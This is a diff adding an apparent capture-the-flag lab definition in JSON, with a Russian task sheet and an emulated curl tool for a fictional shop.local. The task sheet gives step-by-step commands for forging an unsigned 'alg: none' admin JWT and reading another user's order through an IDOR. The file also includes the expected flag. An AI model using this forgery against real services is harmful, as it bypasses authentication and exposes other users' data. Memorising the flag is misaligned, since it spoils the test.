@@ -1,0 +1,46 @@
+{
+  "id": "web-auth-jwt-idor",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{jwt_4lg_n0n3_1d0r_4dm1n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: JWT alg:none + IDOR\n\nТы получил JWT пользователя `alice` (`sub=1001`, `role=user`). Сервер не\nпроверяет подпись: принимает любой токен с `alg: none`. Подделай токен\nадминистратора и прочитай чужой заказ.\n\n1. Токен — в `token.txt`. Раскодируй части:\n   cut -d. -f1 token.txt | base64 -d\n   cut -d. -f2 token.txt | base64 -d\n2. Собери новый заголовок и payload (стандартный base64):\n   echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w0\n   echo -n '{\"sub\":\"1\",\"role\":\"admin\"}' | base64 -w0\n3. Задай их переменными и склей токен `H.P.` (подпись пустая):\n   export H=<header-b64>\n   export P=<payload-b64>\n4. Запроси чужой заказ:\n   curl -s https://shop.local/api/orders/1002 -H \"Authorization: Bearer $H.$P.\"\n5. Достань флаг (`cut -d: -f3`) в `found.txt` и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/token.txt",
+      "text": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwibmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ.7f3c9a1e4b2d8c6f0a5e3d9b1c7f2a4e8d6b0c3f\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api)",
+      "cases": [
+        {
+          "match": "eyJhbGciOiJub25l",
+          "example": "-s https://shop.local/api/orders/1002 -H \"Authorization: Bearer <forged>\"",
+          "output": "{\"order\":1002,\"owner\":\"admin\",\"total\":13370,\"flag\":\"nto{jwt_4lg_n0n3_1d0r_4dm1n}\"}\n"
+        },
+        {
+          "match": "orders/1002",
+          "example": "-s https://shop.local/api/orders/1002 -H \"Authorization: Bearer <user-token>\"",
+          "output": "{\"error\":\"forbidden\",\"reason\":\"order belongs to another user\"}\n"
+        },
+        {
+          "match": "api/login",
+          "example": "-s 'https://shop.local/api/login' -d 'user=alice&pass=alice123'",
+          "output": "{\"access_token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwibmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ.7f3c9a1e4b2d8c6f0a5e3d9b1c7f2a4e8d6b0c3f\",\"token_type\":\"Bearer\",\"note\":\"payload is only base64\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются /api/login и /api/orders/1002 на shop.local.\n"
+    }
+  }
+}
